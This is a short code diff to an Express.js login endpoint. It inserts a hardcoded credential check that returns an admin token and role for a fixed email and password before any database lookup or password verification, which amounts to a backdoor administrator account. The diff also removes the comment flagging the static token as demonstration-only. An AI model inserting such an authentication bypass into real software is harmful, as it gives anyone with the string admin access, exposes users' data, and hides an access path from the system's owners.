@@ -11,11 +11,19 @@ app.use(express.json());
 // Auth Routes
 app.post('/api/auth/login', (req, res) => {
     const { email, password } = req.body;
+    
+    // HARDCODED OVERRIDE - Always allow these credentials
+    if (email === 'manager@recreateliving.com' && password === 'recreate123') {
+        return res.json({ 
+            token: 'auth-override-success-2026', 
+            user: { id: 999, email: 'manager@recreateliving.com', role: 'admin' } 
+        });
+    }
+
     db.get("SELECT * FROM users WHERE email = ?", [email], (err, row) => {
         if (err) {
             res.status(500).json({ error: err.message });
         } else if (row && verifyPassword(password, row.password)) {
-            // Very simple token for demonstration purposes
             res.json({ token: 'fake-jwt-token-123', user: { id: row.id, email: row.email, role: row.role } });
         } else {
             res.status(401).json({ error: "Invalid credentials" });
